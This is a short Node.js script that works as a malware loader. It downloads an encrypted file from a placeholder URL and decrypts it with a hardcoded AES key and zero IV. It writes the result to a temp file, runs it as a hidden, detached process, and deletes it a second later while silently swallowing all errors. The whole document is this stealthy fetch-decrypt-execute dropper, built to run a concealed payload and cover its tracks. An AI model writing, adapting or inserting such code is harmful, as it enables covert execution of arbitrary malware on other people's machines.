const crypto = require('crypto');
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

(async () => {
    const url = 'download encrypted.bin here';

    const key = crypto.createHash('sha256').update('peitanove').digest();
    const iv = Buffer.alloc(16, 0);

    try {
        const encrypted = await downloadFile(url);

        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);

        const tempPath = path.join(os.tmpdir(), 'app_' + Date.now() + '.tmp');
        await fs.promises.writeFile(tempPath, decrypted);

        const child = spawn(tempPath, [], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });
        child.unref();

        setTimeout(() => {
            try {
                fs.unlinkSync(tempPath);
            } catch (e) {}
        }, 1000); 
    } catch (err) {}
})();

function downloadFile(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            if (res.statusCode !== 200) {
                reject(new Error(`Download failed. Status: ${res.statusCode}`));
                return;
            }
            const data = [];
            res.on('data', (chunk) => data.push(chunk));
            res.on('end', () => resolve(Buffer.concat(data)));
        }).on('error', (err) => {
            reject(err);
        });
    });
}
